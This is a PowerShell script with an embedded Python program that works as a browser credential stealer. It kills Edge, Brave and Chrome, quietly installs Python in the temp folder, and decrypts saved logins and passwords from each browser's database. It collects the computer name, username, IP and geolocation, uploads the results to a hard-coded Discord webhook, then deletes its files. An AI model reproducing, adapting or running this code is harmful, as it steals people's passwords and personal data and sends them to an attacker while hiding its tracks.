$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send-Discord {
    param([string]$m)
    try { curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"$m`"}" $wh 2>$null } catch {}
}

Send-Discord "🟢 START - $env:COMPUTERNAME"

Get-Process | Where-Object {$_.ProcessName -match "msedge|brave|chrome"} | Stop-Process -Force -EA 0
Start-Sleep 7

try {
    $pyPath="$env:TEMP\py"
    $needInstall=$false
    
    if(!(Test-Path "$pyPath\python.exe")) {
        $needInstall=$true
    } else {
        cd $pyPath
        $testLibs=.\python.exe -c "import pycryptodome,win32crypt,requests;print('OK')" 2>$null
        if($testLibs -ne "OK") { $needInstall=$true }
    }
    
    if($needInstall) {
        Send-Discord "📥 Installing Python..."
        Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
        Expand-Archive "$env:TEMP\py.zip" $pyPath -Force
        (Get-Content "$pyPath\python311._pth") -replace '#import site','import site'|Out-File "$pyPath\python311._pth" -Encoding ascii
        Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$pyPath\gp.py" -UseBasicParsing
        cd $pyPath
        .\python.exe gp.py --no-warn-script-location 2>$null
        .\python.exe -m pip install pycryptodome pypiwin32 requests --quiet 2>$null
        Remove-Item "$env:TEMP\py.zip" -Force -EA 0
        Send-Discord "✅ Python installed"
    }
    
    cd $pyPath
    
    @'
import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time,hashlib,hmac
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

WH = "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

def send(msg):
    try:
        import requests
        requests.post(WH, json={"content": msg}, timeout=5)
    except:
        pass

send("🐍 Python started - v20 support enabled")

try:
    import requests
    ip=requests.get("https://api.ipify.org",timeout=3).text
    geo=requests.get(f"http://ip-api.com/json/{ip}",timeout=3).json()
    location=f"{geo['city']}, {geo['regionName']}, {geo['country']}"
    isp=geo.get('isp','N/A')
except:
    ip="N/A"
    location="N/A"
    isp="N/A"

import locale
language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"

def decrypt_password(enc_password, key):
    """Déchiffre selon le format détecté"""
    
    if not enc_password or len(enc_password) < 3:
        return None
    
    prefix = enc_password[:3]
    
    # Format v10/v11 (Chrome, Edge, ancien Brave)
    if prefix in [b'v10', b'v11']:
        try:
            nonce = enc_password[3:15]
            ciphertext = enc_password[15:-16]
            tag = enc_password[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
        except:
            pass
    
    # Format v20 (Brave récent)
    elif prefix == b'v20':
        try:
            # v20 utilise une dérivation de clé différente
            nonce = enc_password[3:15]
            ciphertext = enc_password[15:-16]
            tag = enc_password[-16:]
            
            # Dériver une sous-clé pour v20
            # Brave v20 utilise HKDF pour dériver la clé
            import hashlib
            
            # Essayer avec la clé directement d'abord
            try:
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
            except:
                pass
            
            # Si ça échoue, essayer avec une dérivation HKDF
            # HKDF: info = "application_specific_info"
            info = b"application_specific_info"
            salt = b""
            
            # HKDF-Expand
            def hkdf_expand(key, info, length=32):
                import hmac
                okm = b""
                prev = b""
                counter = 1
                while len(okm) < length:
                    prev = hmac.new(key, prev + info + bytes([counter]), hashlib.sha256).digest()
                    okm += prev
                    counter += 1
                return okm[:length]
            
            derived_key = hkdf_expand(key, info, 32)
            
            cipher = AES.new(derived_key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
            
        except Exception as e:
            pass
    
    # DPAPI (très ancien format)
    try:
        return win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        pass
    
    return None

def decrypt_browser(db_path, state_path, browser_name):
    results = []
    
    send(f"🔍 {browser_name}...")
    
    if not os.path.exists(db_path) or not os.path.exists(state_path):
        send(f"❌ {browser_name}: Files not found")
        return results
    
    try:
        with open(state_path, 'r', encoding='utf-8') as f:
            key = win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]
        
        temp_db = f"t_{browser_name}.db"
        if os.path.exists(temp_db):
            os.remove(temp_db)
        
        shutil.copy2(db_path, temp_db)
        time.sleep(1)
        
        conn = sqlite3.connect(temp_db, timeout=120)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
        
        decrypted = 0
        failed = 0
        
        for url, user, enc_pwd in cursor.fetchall():
            pwd = decrypt_password(enc_pwd, key)
            if pwd:
                results.append(f"[{browser_name}] {url}\nUsername: {user}\nPassword: {pwd}\n")
                decrypted += 1
            else:
                failed += 1
        
        conn.close()
        os.remove(temp_db)
        
        send(f"✅ {browser_name}: {decrypted} OK, {failed} failed")
        
    except Exception as e:
        send(f"❌ {browser_name}: {str(e)}")
    
    return results

all_results = []

# Edge
e = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
if os.path.exists(e + r"\Default\Login Data"):
    all_results += decrypt_browser(e + r"\Default\Login Data", e + r"\Local State", "EDGE")

# Brave
b = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
if os.path.exists(b + r"\Default\Login Data"):
    all_results += decrypt_browser(b + r"\Default\Login Data", b + r"\Local State", "BRAVE")

# Chrome
c = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
if os.path.exists(c + r"\Default\Login Data"):
    all_results += decrypt_browser(c + r"\Default\Login Data", c + r"\Local State", "CHROME")

info = f"""{'='*60}
SYSTEM INFORMATION
{'='*60}
Date/Time: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Computer: {platform.node()}
Username: {getpass.getuser()}
OS: {platform.system()} {platform.release()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Language: {language}
IP: {ip}
Location: {location}
ISP: {isp}
{'='*60}
TOTAL: {len(all_results)} passwords
{'='*60}

"""

with open("passwords.txt", "w", encoding="utf-8") as f:
    f.write(info + "\n".join(all_results) if all_results else info + "No passwords found.\n")

send(f"📤 Uploading {len(all_results)} passwords...")
print("OK")
'@ | Out-File "ex.py" -Encoding UTF8
    
    $r = .\python.exe ex.py 2>&1
    
    if ($r -match "OK") {
        curl.exe -F "file=@passwords.txt" $wh 2>$null
        Send-Discord "✅ UPLOAD COMPLETE"
        Remove-Item passwords.txt,ex.py -Force -EA 0
    }
    
} catch {
    Send-Discord "❌ Error: $($_.Exception.Message)"
}

Send-Discord "🧹 DONE"
